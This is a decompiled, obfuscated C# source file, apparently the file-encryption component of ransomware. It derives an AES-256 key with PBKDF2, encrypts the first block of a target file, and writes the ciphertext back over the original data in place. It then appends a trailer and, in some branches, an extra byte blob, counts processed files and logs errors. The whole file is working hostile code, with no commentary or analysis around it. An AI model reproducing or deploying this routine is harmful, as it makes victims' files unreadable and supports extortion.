using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eMvPcEiNWKRwo;

public static class cLYeTxTBifMvTiA
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] MBIBwyqqrY(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = PoondxjzpBebRK(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes PoondxjzpBebRK(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] SlfvoYGuggAUU(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (NXVLxNyJvZLW.dnEIlaYQbZTn == getString_0(107396934))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (NXVLxNyJvZLW.ZdcvQmUKIcPe)
			{
				try
				{
					File.AppendAllText(NXVLxNyJvZLW.jYzmyFxkGGuJi, getString_0(107392642) + string_0 + getString_0(107406918) + ex.Message + getString_0(107397129));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool DcIicDuahJozxMuyl(string KvQkETPykCnn, byte[] ESwOHaZtwoDL, byte[] GvYIVDINSEjKoB = null)
	{
		try
		{
			byte[] array = null;
			if (NXVLxNyJvZLW.dnEIlaYQbZTn == getString_0(107396934))
			{
				array = (NXVLxNyJvZLW.sBOTyxVoVCQkJ ? Encoding.ASCII.GetBytes(NXVLxNyJvZLW.tzJESwPzibp(NXVLxNyJvZLW.TSgiQXLBAlXJz) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406892)) + Convert.ToString(NXVLxNyJvZLW.bHpZgRTqvrgm) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406892))) : Encoding.ASCII.GetBytes(NXVLxNyJvZLW.tzJESwPzibp(NXVLxNyJvZLW.TSgiQXLBAlXJz) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406901)) + Convert.ToString(NXVLxNyJvZLW.bHpZgRTqvrgm) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406901))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(KvQkETPykCnn, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(ESwOHaZtwoDL, 0, ESwOHaZtwoDL.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(KvQkETPykCnn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!NXVLxNyJvZLW.sBOTyxVoVCQkJ)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(GvYIVDINSEjKoB, 0, GvYIVDINSEjKoB.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (NXVLxNyJvZLW.sBOTyxVoVCQkJ ? Encoding.ASCII.GetBytes(NXVLxNyJvZLW.tzJESwPzibp(NXVLxNyJvZLW.TSgiQXLBAlXJz) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406892)) + Convert.ToString(NXVLxNyJvZLW.bHpZgRTqvrgm) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406892))) : Encoding.ASCII.GetBytes(NXVLxNyJvZLW.tzJESwPzibp(NXVLxNyJvZLW.TSgiQXLBAlXJz) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406901)) + Convert.ToString(NXVLxNyJvZLW.bHpZgRTqvrgm) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406901))));
				FileStream fileStream2 = new FileStream(KvQkETPykCnn, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(ESwOHaZtwoDL, 0, ESwOHaZtwoDL.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(KvQkETPykCnn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!NXVLxNyJvZLW.sBOTyxVoVCQkJ)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(GvYIVDINSEjKoB, 0, GvYIVDINSEjKoB.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			NXVLxNyJvZLW.osEpTgsdhQw++;
		}
		catch (Exception ex)
		{
			if (NXVLxNyJvZLW.ZdcvQmUKIcPe)
			{
				try
				{
					File.AppendAllText(NXVLxNyJvZLW.jYzmyFxkGGuJi, getString_0(107392642) + KvQkETPykCnn + getString_0(107406851) + ex.Message + getString_0(107397129));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (NXVLxNyJvZLW.sBOTyxVoVCQkJ ? Encoding.ASCII.GetBytes(NXVLxNyJvZLW.tzJESwPzibp(NXVLxNyJvZLW.TSgiQXLBAlXJz) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406892)) + Convert.ToString(NXVLxNyJvZLW.bHpZgRTqvrgm) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406892))) : Encoding.ASCII.GetBytes(NXVLxNyJvZLW.tzJESwPzibp(NXVLxNyJvZLW.TSgiQXLBAlXJz) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406901)) + Convert.ToString(NXVLxNyJvZLW.bHpZgRTqvrgm) + NXVLxNyJvZLW.tzJESwPzibp(getString_0(107406901))));
				FileStream fileStream4 = new FileStream(KvQkETPykCnn, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(ESwOHaZtwoDL, 0, ESwOHaZtwoDL.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(KvQkETPykCnn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!NXVLxNyJvZLW.sBOTyxVoVCQkJ)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(GvYIVDINSEjKoB, 0, GvYIVDINSEjKoB.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static cLYeTxTBifMvTiA()
	{
		Strings.CreateGetStringDelegate(typeof(cLYeTxTBifMvTiA));
	}
}
